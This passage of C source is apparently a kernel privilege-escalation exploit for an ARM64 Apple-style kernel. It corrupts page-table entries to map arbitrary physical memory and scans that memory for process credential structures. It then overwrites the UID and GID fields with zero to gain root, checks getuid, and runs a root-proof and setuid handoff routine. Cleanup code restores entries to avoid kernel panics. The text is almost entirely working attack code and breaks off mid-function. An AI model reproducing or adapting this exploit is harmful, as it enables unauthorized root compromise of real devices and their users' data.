#define ARM64_PTE_PNXMASK 0x0020000000000000ULL
#define ARM64_PTE_NXMASK 0x0040000000000000ULL
#define ARM64_PTE_WIRED_MASK 0x0400000000000000ULL
#define ARM64_PTE_WRITEABLE_MASK 0x0800000000000000ULL
#define ARM64_PTE_PA_MASK_16K 0x0000ffffffffc000ULL
#define ARM64_PTE_ALLOWED_MASK \
	(ARM64_PTE_TYPE_MASK | ARM64_PTE_ATTRINDXMASK | ARM64_PTE_NS_MASK | \
	 ARM64_PTE_APMASK | ARM64_PTE_SHMASK | ARM64_PTE_AF | ARM64_PTE_NG_MASK | \
	 ARM64_PTE_PAGE_MASK | ARM64_PTE_GP_MASK | ARM64_PTE_PNXMASK | \
	 ARM64_PTE_NXMASK | ARM64_PTE_WIRED_MASK | ARM64_PTE_WRITEABLE_MASK)

static int
pte_like(u64 v)
{
	if ((v & ARM64_PTE_TYPE_MASK) != ARM64_PTE_TYPE_VALID) {
		return 0;
	}
	if ((v & ARM64_PTE_PAGE_MASK) == 0) {
		return 0;
	}
	if ((v & ARM64_PTE_AF) == 0) {
		return 0;
	}
	if ((v & ~ARM64_PTE_ALLOWED_MASK) != 0) {
		return 0;
	}
	return 1;
}

static u64
choose_pte_index(u64 preferred, u64 avoid0, u64 avoid1, u64 avoid2)
{
	if (preferred < 2048 &&
	    preferred != avoid0 &&
	    preferred != avoid1 &&
	    preferred != avoid2) {
		return preferred;
	}
	for (u64 i = 0; i < 16; i++) {
		if (i != avoid0 && i != avoid1 && i != avoid2) {
			return i;
		}
	}
	return preferred;
}

static void
scan_oracle_pte_page(u64 idx, u64 alias_page_index, volatile u64 *p,
    u64 *pte_candidates, u64 *pte_alias_writes, u64 phys_scan_base_runtime)
{
	u64 valid = 0;
	u64 zero = 0;
	u64 other = 0;
	u64 adjacent_pair = 0;
	u64 first_pair = 0xffffffffffffffffULL;

	for (u64 j = 0; j < ORACLE_PTE_SCAN_WORDS; j++) {
		u64 w = p[j];
		if (w == 0) {
			zero++;
		} else if (pte_like(w)) {
			if (j != 0 && pte_like(p[j - 1]) && first_pair == 0xffffffffffffffffULL) {
				first_pair = j - 1;
			}
			valid++;
		} else {
			other++;
		}
	}
	if (first_pair != 0xffffffffffffffffULL) {
		adjacent_pair = 1;
	}

	if (adjacent_pair && valid <= 8 && zero >= (ORACLE_PTE_SCAN_WORDS - 12)) {
		if (*pte_candidates < 16) {
				S("[R] oracle sparse pte candidate index=");
				H(idx);
				S("[R] oracle sparse pte alias_page=");
				H(alias_page_index);
				S("[R] oracle sparse pte first_pair=");
				H(first_pair);
			S("[R] oracle sparse pte valid=");
			H(valid);
			S("[R] oracle sparse pte zero=");
			H(zero);
			S("[R] oracle sparse pte other=");
			H(other);
			for (u64 j = 0; j < ORACLE_PTE_SCAN_DUMP_WORDS; j++) {
				S("[R] oracle sparse pte word=");
				H(j);
				S("[R] oracle sparse pte value=");
				H(p[j]);
			}
		}
		(*pte_candidates)++;
#if ORACLE_PTE_WRITE_ALIAS > 0
			if (*pte_alias_writes < ORACLE_PTE_ALIAS_WRITE_LIMIT) {
				u64 write_ordinal = *pte_alias_writes;
				volatile u64 *base = (volatile u64 *)ORACLE_BASES[idx];
				u64 src_index = choose_pte_index(ORACLE_PTE_WRITE_SRC_INDEX, alias_page_index, 0xffffffffffffffffULL, 0xffffffffffffffffULL);
				u64 dst_index = choose_pte_index(ORACLE_PTE_WRITE_DST_INDEX, alias_page_index, src_index, 0xffffffffffffffffULL);
				u64 owner_index = choose_pte_index(ORACLE_PTE_OWNER_MAP_INDEX, alias_page_index, src_index, dst_index);
#if ORACLE_PTE_OWNER_MAP_FRESH_ALT_TEST > 0
				u64 owner_alt_index = choose_pte_index(ORACLE_PTE_OWNER_MAP_ALT_INDEX, alias_page_index, src_index, dst_index);
#endif
				volatile u64 *src_va = (volatile u64 *)(ORACLE_BASES[idx] + src_index * PAGE_SZ);
				volatile u64 *dst_va = (volatile u64 *)(ORACLE_BASES[idx] + dst_index * PAGE_SZ);
				u64 src_pte = p[src_index];
				u64 old_dst_pte = p[dst_index];
			u64 src_before;
			u64 dst_before;
			u64 src_after;
			u64 direct_dec_idx = 0;
			u64 direct_dec_which = 0;
			u64 direct_decoded = 0;
			u64 marker = ORACLE_PTE_WRITE_MARKER ^ idx;

				p[dst_index] = src_pte;
			asm volatile("dsb ish\nisb" ::: "memory");

			src_before = src_va[0];
#if ORACLE_PTE_OWNER_MINCORE > 0 || ORACLE_PTE_OWNER_HW_WINDOW > 0
			dst_before = 0;
			src_after = src_before;
#else
			dst_before = dst_va[0];
			direct_decoded = (u64)oracle_decode(dst_before, &direct_dec_idx, &direct_dec_which);
			if (direct_decoded) {
#if ORACLE_PTE_EXISTING_ALIAS_SCAN > 0 && ORACLE_PTE_EXISTING_ALIAS_ALLOW_SELF > 0
				src_after = src_va[0];
#else
				dst_va[0] = marker;
				asm volatile("dsb ish\nisb" ::: "memory");
				src_after = src_va[0];
#endif
			} else {
				src_after = src_before;
			}
#endif

			S("[R] oracle pte alias write index=");
			H(idx);
			S("[R] oracle pte alias write ordinal=");
			H(write_ordinal);
				S("[R] oracle pte alias src_index=");
				H(src_index);
				S("[R] oracle pte alias dst_index=");
				H(dst_index);
				S("[R] oracle pte alias owner_index=");
				H(owner_index);
				S("[R] oracle pte alias src_pte=");
				H(src_pte);
				S("[R] oracle pte alias old_dst_pte=");
				H(old_dst_pte);
				S("[R] oracle pte alias new_dst_pte=");
				H(p[dst_index]);
			S("[R] oracle pte alias src_before=");
			H(src_before);
			S("[R] oracle pte alias dst_before=");
			H(dst_before);
			S("[R] oracle pte alias direct_decoded=");
			H(direct_decoded);
			S("[R] oracle pte alias direct_to=");
			H(direct_dec_idx);
			S("[R] oracle pte alias direct_which=");
			H(direct_dec_which);
			S("[R] oracle pte alias marker=");
			H(marker);
			S("[R] oracle pte alias src_after=");
			H(src_after);
			S("[R] oracle pte alias base_v0=");
			H(base[0]);
#if ORACLE_PTE_OWNER_HW_WINDOW > 0
			u64 hw_hits = 0;
			u64 hw_decoded = 0;
			u64 lo = idx > ORACLE_PTE_OWNER_HW_WINDOW ? idx - ORACLE_PTE_OWNER_HW_WINDOW : 0;
			u64 hi = idx + ORACLE_PTE_OWNER_HW_WINDOW + 1;
			if (hi > ORACLE_REGIONS) {
				hi = ORACLE_REGIONS;
			}
			for (u64 k = lo; k < hi; k++) {
				u64 b = ORACLE_BASES[k];
				u64 val;
				u64 dec_idx;
				u64 dec_which;
				if (b == 0) {
					continue;
				}
						volatile u64 *owner_dst = (volatile u64 *)(b + dst_index * PAGE_SZ);
				val = owner_dst[0];
				if (val == 0) {
					continue;
				}
				if (hw_hits < 16) {
					S("[R] oracle pte owner hw slot=");
					H(k);
					S("[R] oracle pte owner hw value=");
					H(val);
				}
				hw_hits++;
				if (hw_decoded == 0 && oracle_decode(val, &dec_idx, &dec_which)) {
					volatile u64 *owner_src = (volatile u64 *)(ORACLE_BASES[dec_idx] + dec_which * PAGE_SZ);
					u64 hw_marker = ORACLE_PTE_WRITE_MARKER ^ k;
					u64 before = owner_src[0];
					owner_dst[0] = hw_marker;
					asm volatile("dsb ish\nisb" ::: "memory");
					S("[R] oracle pte owner hw decoded slot=");
					H(k);
					S("[R] oracle pte owner hw to=");
					H(dec_idx);
					S("[R] oracle pte owner hw which=");
					H(dec_which);
					S("[R] oracle pte owner hw src_before=");
					H(before);
					S("[R] oracle pte owner hw marker=");
					H(hw_marker);
					S("[R] oracle pte owner hw src_after=");
					H(owner_src[0]);
					hw_decoded++;
					break;
				}
			}
			S("[R] oracle pte owner hw lo=");
			H(lo);
			S("[R] oracle pte owner hw hi=");
			H(hi);
			S("[R] oracle pte owner hw hits=");
			H(hw_hits);
			S("[R] oracle pte owner hw decoded=");
			H(hw_decoded);
#endif
#if ORACLE_PTE_OWNER_MINCORE > 0
			u64 owner_hits = 0;
			u64 owner_decoded = 0;
			for (u64 k = 0; k < ORACLE_REGIONS; k++) {
				u64 b = ORACLE_BASES[k];
				char vec = 0;
				long mr;
				if (b == 0) {
					continue;
				}
					mr = sc6(78, b + dst_index * PAGE_SZ, PAGE_SZ, (long)&vec, 0, 0, 0);
				if (mr != 0 || ((u64)(unsigned char)vec & MINCORE_INCORE) == 0) {
					continue;
				}
				if (owner_hits < 16) {
					S("[R] oracle pte owner mincore slot=");
					H(k);
					S("[R] oracle pte owner mincore vec=");
					H((u64)(unsigned char)vec);
				}
				owner_hits++;
				if (owner_decoded == 0) {
					volatile u64 *owner_dst = (volatile u64 *)(b + dst_index * PAGE_SZ);
					u64 owner_val = owner_dst[0];
					u64 dec_idx;
					u64 dec_which;
					S("[R] oracle pte owner value=");
					H(owner_val);
					if (oracle_decode(owner_val, &dec_idx, &dec_which)) {
						volatile u64 *owner_src = (volatile u64 *)(ORACLE_BASES[dec_idx] + dec_which * PAGE_SZ);
						u64 owner_marker = ORACLE_PTE_WRITE_MARKER ^ k;
						u64 before = owner_src[0];
						owner_dst[0] = owner_marker;
						asm volatile("dsb ish\nisb" ::: "memory");
						S("[R] oracle pte owner decoded slot=");
						H(k);
						S("[R] oracle pte owner to=");
						H(dec_idx);
						S("[R] oracle pte owner which=");
						H(dec_which);
						S("[R] oracle pte owner src_before=");
						H(before);
						S("[R] oracle pte owner marker=");
						H(owner_marker);
						S("[R] oracle pte owner src_after=");
						H(owner_src[0]);
						owner_decoded++;
					}
				}
			}
			S("[R] oracle pte owner mincore hits=");
			H(owner_hits);
			S("[R] oracle pte owner decoded=");
			H(owner_decoded);
#endif
#if ORACLE_PTE_EXISTING_ALIAS_SCAN > 0
			u64 existing_hits = 0;
			u64 existing_decoded = 0;
			for (u64 k = 0; k < ORACLE_REGIONS; k++) {
				u64 b = ORACLE_BASES[k];
				u64 val;
				u64 dec_idx;
				u64 dec_which;
				if (b == 0) {
					continue;
				}
					volatile u64 *existing_dst = (volatile u64 *)(b + dst_index * PAGE_SZ);
				val = existing_dst[0];
				if (!oracle_decode(val, &dec_idx, &dec_which)) {
					continue;
				}
					if (dec_idx != k || dec_which != src_index) {
					continue;
				}
#if ORACLE_PTE_EXISTING_ALIAS_ALLOW_SELF == 0
				if (k == idx) {
					continue;
				}
#endif
				if (existing_hits < 16) {
					S("[R] oracle pte existing alias slot=");
					H(k);
					S("[R] oracle pte existing alias value=");
					H(val);
				}
				existing_hits++;
				if (existing_decoded == 0) {
						volatile u64 *existing_src = (volatile u64 *)(b + src_index * PAGE_SZ);
					u64 existing_marker = ORACLE_PTE_WRITE_MARKER ^ k;
					u64 before = existing_src[0];
					existing_dst[0] = existing_marker;
					asm volatile("dsb ish\nisb" ::: "memory");
					S("[R] oracle pte existing alias decoded slot=");
					H(k);
					S("[R] oracle pte existing alias to=");
					H(dec_idx);
					S("[R] oracle pte existing alias which=");
					H(dec_which);
					S("[R] oracle pte existing alias src_before=");
					H(before);
					S("[R] oracle pte existing alias marker=");
					H(existing_marker);
					S("[R] oracle pte existing alias src_after=");
					H(existing_src[0]);
#if ORACLE_PTE_OWNER_RESTORE_DST > 0
						p[dst_index] = old_dst_pte;
					asm volatile("dsb ish\nisb" ::: "memory");
					S("[R] oracle pte existing alias restore_index=");
						H(dst_index);
						S("[R] oracle pte existing alias restored_pte=");
						H(p[dst_index]);
#endif
#if ORACLE_PTE_OWNER_MAP_TEST > 0
						volatile u64 *owner_map = (volatile u64 *)(b + owner_index * PAGE_SZ);
						u64 old_map_pte = p[owner_index];
					u64 map_marker = (ORACLE_PTE_WRITE_MARKER ^ 0x22220000ULL) ^ k;
					u64 map_before;
#if ORACLE_ROOT_PROOF > 0
					u64 root_proof_hit = 0;
#endif
						p[owner_index] = src_pte;
					asm volatile("dsb ish\nisb" ::: "memory");
					map_before = owner_map[0];
					owner_map[0] = map_marker;
					asm volatile("dsb ish\nisb" ::: "memory");
					S("[R] oracle pte owner map slot=");
					H(k);
					S("[R] oracle pte owner map index=");
						H(owner_index);
					S("[R] oracle pte owner map old_pte=");
					H(old_map_pte);
					S("[R] oracle pte owner map new_pte=");
						H(p[owner_index]);
					S("[R] oracle pte owner map before=");
					H(map_before);
					S("[R] oracle pte owner map marker=");
					H(map_marker);
					S("[R] oracle pte owner map src_after=");
					H(existing_src[0]);
					S("[R] oracle pte owner map map_after=");
					H(owner_map[0]);
#if ORACLE_PTE_OWNER_MAP_ALT_TEST > 0
						volatile u64 *existing_dst_restored = (volatile u64 *)(b + dst_index * PAGE_SZ);
					u64 alt_marker = (ORACLE_PTE_WRITE_MARKER ^ 0x33330000ULL) ^ k;
					u64 alt_before;
						p[owner_index] = old_dst_pte;
					asm volatile("dsb ish\nisb" ::: "memory");
					alt_before = owner_map[0];
					owner_map[0] = alt_marker;
					asm volatile("dsb ish\nisb" ::: "memory");
					S("[R] oracle pte owner map alt old_pte=");
					H(src_pte);
					S("[R] oracle pte owner map alt new_pte=");
						H(p[owner_index]);
					S("[R] oracle pte owner map alt before=");
					H(alt_before);
					S("[R] oracle pte owner map alt marker=");
					H(alt_marker);
					S("[R] oracle pte owner map alt dst_after=");
					H(existing_dst_restored[0]);
					S("[R] oracle pte owner map alt map_after=");
					H(owner_map[0]);
#endif
#if ORACLE_PTE_OWNER_MAP_FRESH_ALT_TEST > 0
						volatile u64 *owner_alt = (volatile u64 *)(b + owner_alt_index * PAGE_SZ);
						volatile u64 *fresh_dst_restored = (volatile u64 *)(b + dst_index * PAGE_SZ);
						u64 old_alt_pte = p[owner_alt_index];
					u64 fresh_marker = (ORACLE_PTE_WRITE_MARKER ^ 0x44440000ULL) ^ k;
					u64 fresh_before;
						p[owner_alt_index] = old_dst_pte;
					asm volatile("dsb ish\nisb" ::: "memory");
					fresh_before = owner_alt[0];
					owner_alt[0] = fresh_marker;
					asm volatile("dsb ish\nisb" ::: "memory");
					S("[R] oracle pte owner fresh alt slot=");
					H(k);
					S("[R] oracle pte owner fresh alt index=");
						H(owner_alt_index);
					S("[R] oracle pte owner fresh alt old_pte=");
					H(old_alt_pte);
					S("[R] oracle pte owner fresh alt new_pte=");
						H(p[owner_alt_index]);
					S("[R] oracle pte owner fresh alt before=");
					H(fresh_before);
					S("[R] oracle pte owner fresh alt marker=");
					H(fresh_marker);
					S("[R] oracle pte owner fresh alt dst_after=");
					H(fresh_dst_restored[0]);
					S("[R] oracle pte owner fresh alt alt_after=");
					H(owner_alt[0]);
#endif
#if ORACLE_PTE_PHYS_SCAN > 0
						u64 phys_base_start = phys_scan_base_runtime;
						u64 phys_flags = src_pte & ~ARM64_PTE_PA_MASK_16K;
						u64 phys_total_programmed = 0;
						u64 phys_hits = 0;
						u64 cred_hits = 0;
						u64 cred_patches = 0;
						u64 cred_restores = 0;
						u64 found_own = 0;
#if ORACLE_PTE_PHYS_SCRUB > 0
						u64 phys_scrubbed = 0;
#endif
#if ORACLE_STOP_AFTER_ROOT_HIT > 0
						u64 phys_stop = 0;
#endif
#if ORACLE_PTE_PHYS_SCAN_RESTORE > 0
						u64 phys_total_restored = 0;
#endif
						S("[R] oracle phys scan flags=");
						H(phys_flags);
						for (u64 chunk = 0; chunk < ORACLE_PTE_PHYS_SCAN_CHUNKS; chunk++) {
							u64 phys_base = phys_base_start;
							u64 phys_window = chunk;
#if ORACLE_PTE_PHYS_SCAN_REVERSE > 0
							if (phys_base != 0) {
								phys_window = ORACLE_PTE_PHYS_SCAN_CHUNKS - 1 - chunk;
							}
#endif
							u64 phys_programmed = 0;
							if (phys_base == 0) {
								phys_base = (src_pte & ARM64_PTE_PA_MASK_16K) +
								    chunk * ORACLE_PTE_PHYS_SCAN_WINDOW_STRIDE;
							} else {
								phys_window += write_ordinal * ORACLE_PTE_PHYS_SCAN_CHUNKS;
								phys_base += phys_window * ORACLE_PTE_PHYS_SCAN_WINDOW_STRIDE;
							}
							S("[R] oracle phys scan window=");
							H(phys_window);
							S("[R] oracle phys scan base=");
							H(phys_base);
							for (u64 m = 0; m < ORACLE_PTE_PHYS_SCAN_PAGES; m++) {
								u64 pidx = ORACLE_PTE_PHYS_SCAN_START_INDEX + m;
								u64 pa = phys_base + m * PAGE_SZ;
								if (pidx >= 2048) {
									break;
								}
#if ORACLE_PTE_PHYS_SCAN_RESTORE > 0
								OLD_PHYS_PTES[phys_programmed] = p[pidx];
#endif
								p[pidx] = phys_flags | (pa & ARM64_PTE_PA_MASK_16K);
								phys_programmed++;
							}
							asm volatile("dsb ish\nisb" ::: "memory");
							phys_total_programmed += phys_programmed;
							for (u64 m = 0; m < phys_programmed; m++) {
								u64 pidx = ORACLE_PTE_PHYS_SCAN_START_INDEX + m;
								u64 pa = phys_base + m * PAGE_SZ;
								volatile u64 *phys_va = (volatile u64 *)(b + pidx * PAGE_SZ);
								u64 first = phys_va[0];
#if ORACLE_PTE_PHYS_SCRUB > 0
								for (u64 so = 0; so < PAGE_SZ / 8; so++) {
									if (phys_va[so] == (u64)(ORACLE_PTE_PHYS_SCRUB_VALUE)) {
										phys_va[so] = 0;
										phys_scrubbed++;
									}
								}
#endif
								if (m < ORACLE_PTE_PHYS_SCAN_DUMP) {
									S("[R] oracle phys scan page=");
									H(m);
									S("[R] oracle phys scan pa=");
									H(pa);
									S("[R] oracle phys scan first=");
									H(first);
								}
	#if ORACLE_PTE_PHYS_SCAN_SEARCH_WORD > 0
									for (u64 off = ORACLE_PTE_PHYS_SCAN_WORD_PHASE;
									    off + 8 <= PAGE_SZ;
									    off += ORACLE_PTE_PHYS_SCAN_WORD_STEP) {
										u64 w = load_le64_bytes((const volatile u8 *)phys_va + off);
#if PROCNAME_MARKER > 0
									if (w == PHYS_SCAN_WORD_RUNTIME) {
										u64 marker2 = 0;
										if (off + 16 > PAGE_SZ) {
											continue;
										}
										marker2 = load_le64_bytes((const volatile u8 *)phys_va + off + 8);
										if (marker2 != PROCNAME_MARKER_WORD1) {
											continue;
										}
#else
									if (w == ORACLE_PTE_PHYS_SCAN_WORD) {
#if ORACLE_PTE_PHYS_SCAN_WORD1 != 0 || ORACLE_PTE_PHYS_SCAN_WORD1_ARG > 0
										u64 marker2 = 0;
										if (off + 16 > PAGE_SZ) {
											continue;
										}
										marker2 = load_le64_bytes((const volatile u8 *)phys_va + off + 8);
										if (marker2 != PHYS_SCAN_WORD1_RUNTIME) {
											continue;
										}
#endif
#endif
										S("[R] oracle phys scan word hit page=");
										H(m);
										S("[R] oracle phys scan word hit pa=");
										H(pa + off);
										S("[R] oracle phys scan word hit value=");
										H(w);
										report_phys_word_hit_context((volatile u8 *)phys_va, off, pa + off);
#if ORACLE_PTE_PHYS_SCAN_HIT_DUMP_WORDS > 0
										u64 dump_off = off;
										u64 back_bytes = ORACLE_PTE_PHYS_SCAN_HIT_DUMP_BACK_WORDS * 8;
										if (dump_off > back_bytes) {
											dump_off -= back_bytes;
										} else {
											dump_off = 0;
										}
										for (u64 d = 0; d < ORACLE_PTE_PHYS_SCAN_HIT_DUMP_WORDS; d++) {
											u64 cur_off = dump_off + d * 8;
											if (cur_off >= PAGE_SZ) {
												break;
											}
											S("[R] oracle phys scan hit dump pa=");
											H(pa + cur_off);
											S("[R] oracle phys scan hit dump value=");
											H(phys_va[cur_off / 8]);
										}
#endif
										phys_hits++;
										break;
									}
								}
#endif
#if ORACLE_PTE_PHYS_CRED_SCAN > 0
								for (u64 off = 0; off + 0x60 < PAGE_SZ; off += 4) {
									volatile u32 *c = (volatile u32 *)((u64)phys_va + off);
									u32 ngroups;
#if ORACLE_PTE_PHYS_CRED_RELAXED_UIDS > 0
									u32 uid_matches = 0;
									if (c[0] == ORACLE_PTE_PHYS_CRED_UID) {
										uid_matches++;
									}
									if (c[1] == ORACLE_PTE_PHYS_CRED_UID) {
										uid_matches++;
									}
									if (c[2] == ORACLE_PTE_PHYS_CRED_UID) {
										uid_matches++;
									}
									if (uid_matches < 2) {
										continue;
									}
#else
									if (c[0] != ORACLE_PTE_PHYS_CRED_UID ||
									    c[1] != ORACLE_PTE_PHYS_CRED_UID ||
									    c[2] != ORACLE_PTE_PHYS_CRED_UID) {
										continue;
									}
#endif
#if ORACLE_PTE_PHYS_CRED_ANY_GID == 0
									if (c[4] != ORACLE_PTE_PHYS_CRED_GID) {
										continue;
									}
#endif
									ngroups = c[3] & 0xffffU;
									if (ngroups == 0 || ngroups > 16) {
										continue;
									}
									if (cred_hits < 16) {
										S("[R] oracle phys cred hit pa=");
										H(pa + off);
										S("[R] oracle phys cred uid0=");
										H(c[0]);
										S("[R] oracle phys cred uid1=");
										H(c[1]);
										S("[R] oracle phys cred uid2=");
										H(c[2]);
										S("[R] oracle phys cred ngroups=");
										H(ngroups);
										S("[R] oracle phys cred gid0=");
										H(c[4]);
										S("[R] oracle phys cred rgid=");
										H(c[20]);
										S("[R] oracle phys cred svgid=");
										H(c[21]);
										S("[R] oracle phys cred gmuid=");
										H(c[22]);
									}
									cred_hits++;
#if ORACLE_PTE_PHYS_CRED_PATCH > 0
									if (!found_own && cred_patches < ORACLE_PTE_PHYS_CRED_MAX_PATCH) {
#if ORACLE_PTE_PHYS_CRED_RESTORE_MISS > 0
										u32 old_uid0 = c[0], old_uid1 = c[1], old_uid2 = c[2];
										u32 old_gid0 = c[4], old_rgid = c[20], old_svgid = c[21], old_gmuid = c[22];
#endif
										c[0] = 0; c[1] = 0; c[2] = 0; c[4] = 0; c[20] = 0; c[21] = 0; c[22] = 0;
										asm volatile("dsb ish\nisb" ::: "memory");
										S("[R] oracle phys cred patched pa="); H(pa + off);
										cred_patches++;
										{
											u64 cur_uid = (u64)sc6(24, 0, 0, 0, 0, 0, 0);
											u64 cur_euid = (u64)sc6(25, 0, 0, 0, 0, 0, 0);
											if (cur_uid == 0 && cur_euid == 0) {
												S("[R] oracle current cred patched pa="); H(pa + off);
												found_own = 1;
#if ORACLE_STOP_AFTER_ROOT_HIT > 0
												phys_stop = 1;
#endif
											}
#if ORACLE_PTE_PHYS_CRED_RESTORE_MISS > 0
											else {
												c[0] = old_uid0; c[1] = old_uid1; c[2] = old_uid2; c[4] = old_gid0;
												c[20] = old_rgid; c[21] = old_svgid; c[22] = old_gmuid;
												asm volatile("dsb ish\nisb" ::: "memory");
												cred_restores++;
												S("[R] oracle phys cred restored pa="); H(pa + off);
											}
#endif
										}
									}
#endif
								}
#if ORACLE_STOP_AFTER_ROOT_HIT > 0
								if (phys_stop) {
									break;
								}
#endif
#endif
#if ORACLE_STOP_AFTER_ROOT_HIT > 0
								if (phys_stop) {
									break;
								}
#endif
							}
#if ORACLE_PTE_PHYS_SCAN_RESTORE > 0
							for (u64 m = 0; m < phys_programmed; m++) {
								u64 pidx = ORACLE_PTE_PHYS_SCAN_START_INDEX + m;
								if (pidx >= 2048) {
									break;
								}
								p[pidx] = OLD_PHYS_PTES[m];
							}
							asm volatile("dsb ish\nisb" ::: "memory");
							phys_total_restored += phys_programmed;
#endif
#if ORACLE_STOP_AFTER_ROOT_HIT > 0
							if (phys_stop) {
								break;
							}
#endif
						}
						S("[R] oracle phys scan chunks=");
						H(ORACLE_PTE_PHYS_SCAN_CHUNKS);
						S("[R] oracle phys scan programmed=");
						H(phys_total_programmed);
#if ORACLE_PTE_PHYS_SCAN_RESTORE > 0
						S("[R] oracle phys scan restored=");
						H(phys_total_restored);
#endif
						S("[R] oracle phys scan hits=");
						H(phys_hits);
#if ORACLE_PTE_PHYS_CRED_SCAN > 0
					S("[R] oracle phys cred hits=");
					H(cred_hits);
					S("[R] oracle phys cred patches=");
					H(cred_patches);
					S("[R] oracle phys cred restores=");
					H(cred_restores);
#if ORACLE_PTE_PHYS_SCRUB > 0
					S("[R] oracle phys scrubbed=");
					H(phys_scrubbed);
#endif
					u64 post_uid = (u64)sc6(24, 0, 0, 0, 0, 0, 0);
					S("[R] oracle post getuid=");
					H(post_uid);
					S("[R] oracle post geteuid=");
					H((u64)sc6(25, 0, 0, 0, 0, 0, 0));
					S("[R] oracle post getgid=");
					H((u64)sc6(47, 0, 0, 0, 0, 0, 0));
					S("[R] oracle post getegid=");
					H((u64)sc6(43, 0, 0, 0, 0, 0, 0));
#if ORACLE_ROOT_PROOF > 0
					if (post_uid == 0) {
						root_proof_action();
#if SUID_HANDOFF > 0
						suid_handoff();
#endif
						root_proof_hit = 1;
					}
#endif
#endif
#endif
#if ORACLE_PTE_OWNER_MAP_RESTORE > 0
						p[owner_index] = old_map_pte;
					asm volatile("dsb ish\nisb" ::: "memory");
					S("[R] oracle pte owner map restored_pte=");
						H(p[owner_index]);
#endif
#if SURVIVE_LOOP > 0
						/* Clean the self-referential page-0 alias (slot page-0 PTE -> its own L3
						 * table) REGARDLESS of scrub; left corrupted it panics pmap_remove_pv on
						 * teardown/pageout. */
						p[0] = 0;
						asm volatile("dsb ish\nisb" ::: "memory");
						/* All intentional PTE corruption for this candidate is now restored/cleaned
						 * (phys-scan-restore + owner-map-restore + this p[0]). On a confirmed root
						 * hit, survive (idle) immediately to stop any further scanning/OOB and to
						 * hold the in-place-patched cred (so it's never unref'd -> no SMR panic). */
						if (root_proof_hit) {
							survive_forever();
						}
#endif
#if ORACLE_ROOT_PROOF > 0 && ORACLE_EXIT_AFTER_ROOT_PROOF > 0
					if (root_proof_hit) {
						S("[R] root proof cleanup exit\n");
						sc6(1, 0, 0, 0, 0, 0, 0);
						for (;;) {
						}
					}
#endif
#endif
					(*pte_alias_writes)++;
					existing_decoded++;
					break;
				}
			}
			if (existing_decoded == 0) {
#if ORACLE_PTE_OWNER_RESTORE_DST > 0
					p[dst_index] = old_dst_pte;
				asm volatile("dsb ish\nisb" ::: "memory");
				S("[R] oracle pte existing alias no-owner restored_pte=");
					H(p[dst_index]);
#endif
			}
			S("[R] oracle pte existing alias hits=");
			H(existing_hits);
			S("[R] oracle pte existing alias decoded=");
			H(existing_decoded);
#endif
#if ORACLE_PTE_WRITE_SCAN_ALL > 0
			u64 scan_hits = 0;
			u64 scan_decoded = 0;
			for (u64 k = 0; k < ORACLE_REGIONS; k++) {
				u64 b = ORACLE_BASES[k];
				u64 val;
				u64 dec_idx;
				u64 dec_which;
				if (b == 0) {
					continue;
				}
					volatile u64 *scan_dst = (volatile u64 *)(b + dst_index * PAGE_SZ);
				val = scan_dst[0];
				if (val == 0) {
					continue;
				}
				if (scan_hits < 16) {
					S("[R] oracle pte alias scan hit slot=");
					H(k);
					S("[R] oracle pte alias scan value=");
					H(val);
				}
				scan_hits++;
				if (oracle_decode(val, &dec_idx, &dec_which)) {
					volatile u64 *scan_src = (volatile u64 *)(ORACLE_BASES[dec_idx] + dec_which * PAGE_SZ);
					u64 scan_marker = ORACLE_PTE_WRITE_MARKER ^ k;
					u64 before = scan_src[0];
					scan_dst[0] = scan_marker;
					asm volatile("dsb ish\nisb" ::: "memory");
					S("[R] oracle pte alias scan decoded slot=");
					H(k);
					S("[R] oracle pte alias scan to=");
					H(dec_idx);
					S("[R] oracle pte alias scan which=");
					H(dec_which);
					S("[R] oracle pte alias scan src_before=");
					H(before);
					S("[R] oracle pte alias scan marker=");
					H(scan_marker);
					S("[R] oracle pte alias scan src_after=");
					H(scan_src[0]);
					scan_decoded++;
					break;
				}
			}
			S("[R] oracle pte alias scan hits=");
			H(scan_hits);
			S("[R] oracle pte alias scan decoded=");
			H(scan_decoded);
#endif
#if ORACLE_PTE_EXISTING_ALIAS_SCAN == 0
			(*pte_alias_writes)++;
#endif
		}
#else
		(void)pte_alias_writes;
#endif
	}
}
#endif

static void
setup_oracle_regions(void)
{
	u64 made = 0;
#if ORACLE_WITH_HOLES && ORACLE_DEFER_HOLE_FREE
	u64 holes_saved = 0;
#endif

#if ORACLE_WITH_HOLES
	for (u64 i = 0; i < ORACLE_REGIONS; i++) {
		long holes[ORACLE_HOLE_PAGES];
		long p;
		u64 base;
		volatile u64 *p0;
		volatile u64 *p1;
		u64 ok = 1;

		for (u64 j = 0; j < ORACLE_HOLE_PAGES; j++) {
			holes[j] = sc6(197, 0, PAGE_SZ, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
			if ((u64)holes[j] < 0x100000000ULL) {
				ok = 0;
				break;
			}
#if ORACLE_DEFER_HOLE_FREE
			if (holes_saved < ORACLE_REGIONS * ORACLE_HOLE_PAGES) {
				ORACLE_HOLES[holes_saved++] = (u64)holes[j];
			}
#endif
		}

		p = sc6(197, 0, ORACLE_STRIDE * 2, PROT_RW, MAP_PRIVATE_ANON, -1, 0);
		if (ok == 0 || (u64)p < 0x100000000ULL) {
			break;
		}
		for (u64 j = 0; j < ORACLE_HOLE_PAGES; j++) {
			*(volatile u64 *)(u64)holes[j] = 0;
		}
		base = align_up((u64)p, ORACLE_STRIDE);
		p0 = (volatile u64 *)base;
			p1 = (volatile u64 *)(base + PAGE_SZ);
			p0[0] = ORACLE_SENT0 ^ i;
			p1[0] = ORACLE_SENT1 ^ i;
			for (u64 j = 2; j < ORACLE_TRACK_PAGES; j++) {
				volatile u64 *pj = (volatile u64 *)(base + j * PAGE_SZ);
				pj[0] = oracle_extra_sent(i, j);
			}
#if ORACLE_EXTRA_PAGE_INDEX < 2048
			if (ORACLE_EXTRA_PAGE_INDEX >= ORACLE_TRACK_PAGES) {
				volatile u64 *px = (volatile u64 *)(base + ORACLE_EXTRA_PAGE_INDEX * PAGE_SZ);
				px[0] = oracle_extra_sent(i, ORACLE_EXTRA_PAGE_TAG);
			}
#endif
			ORACLE_BASES[i] = (u64)p0;
#if ORACLE_DEFER_HOLE_FREE == 0
		for (u64 j = 0; j < ORACLE_HOLE_PAGES; j++) {
			sc6(73, holes[j], PAGE_SZ, 0, 0, 0, 0);
		}
#else
		(void)holes;
#endif
		made++;
	}
#if ORACLE_DEFER_HOLE_FREE
	for (u64 i = 0; i < holes_saved; i++) {
		u64 idx = oracle_hole_free_index(i, holes_saved);
